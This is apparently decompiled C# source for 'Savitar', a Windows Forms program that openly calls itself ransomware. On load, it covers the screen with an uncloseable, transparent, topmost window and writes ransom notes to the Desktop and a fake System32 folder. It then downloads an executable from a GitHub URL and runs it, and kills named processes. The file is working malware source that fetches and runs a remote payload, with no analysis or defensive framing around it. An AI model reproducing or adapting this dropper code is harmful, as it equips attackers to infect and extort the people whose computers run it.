using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Windows.Forms;

namespace Savitar;

public class Savitar : Form
{
	private IContainer components = null;

	public Savitar()
	{
		InitializeComponent();
		((Form)this).set_TransparencyKey(((Control)this).get_BackColor());
	}

	private void Savitar_FormClosing(object sender, FormClosingEventArgs e)
	{
		((CancelEventArgs)(object)e).Cancel = true;
	}

	private void Savitar_Load_1(object sender, EventArgs e)
	{
		Directory.CreateDirectory("C:\\Program Files\\System32");
		File.WriteAllText("C:\\Program Files\\System32\\README.txt", "Hi I'm Savitar. I'm not typical ransomware you will see why... :))) ");
		((Control)this).set_Left(0);
		((Control)this).set_Top(0);
		((Control)this).set_Width(Screen.get_PrimaryScreen().get_Bounds().Width);
		((Control)this).set_Height(Screen.get_PrimaryScreen().get_Bounds().Height);
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
		string path = folderPath + "\\._cache_DCQPKX.exe";
		if (!File.Exists(path))
		{
			string folderPath2 = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
			using StreamWriter streamWriter = File.CreateText(folderPath2 + "\\._cache_DCQPKX.exe");
			streamWriter.WriteLine("Your files has been locked by Savitar Virus)");
		}
		string folderPath3 = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
		using (StreamWriter streamWriter2 = File.CreateText(folderPath3 + "\\Savitar.txt"))
		{
			streamWriter2.WriteLine("Your files has been locked by Savitar Virus");
		}
		ServicePointManager.Expect100Continue = true;
		ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
		WebClient webClient = new WebClient();
		webClient.DownloadFile("https://github.com/KOZ1OL/SAVITAR/raw/main/SavitarRW.exe", "C:\\Program Files\\System32\\SavitarRW.exe");
		Process.Start("C:\\Program Files\\System32\\SavitarRW.exe");
		Process[] array = null;
		array = Process.GetProcessesByName("DCQPKX");
		Process[] array2 = array;
		foreach (Process process in array2)
		{
			process.Kill();
		}
		Process[] array3 = null;
		array3 = Process.GetProcessesByName("._cache_DCQPKX");
		Process[] array4 = array3;
		foreach (Process process2 in array4)
		{
			process2.Kill();
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0072: Unknown result type (might be due to invalid IL or missing references)
		//IL_007c: Expected O, but got Unknown
		((Control)this).SuspendLayout();
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(10, 10));
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("Savitar");
		((Form)this).set_StartPosition((FormStartPosition)0);
		((Control)this).set_Text("Savitar");
		((Form)this).set_TopMost(true);
		((Form)this).add_FormClosing(new FormClosingEventHandler(Savitar_FormClosing));
		((Form)this).add_Load((EventHandler)Savitar_Load_1);
		((Control)this).ResumeLayout(false);
	}
}
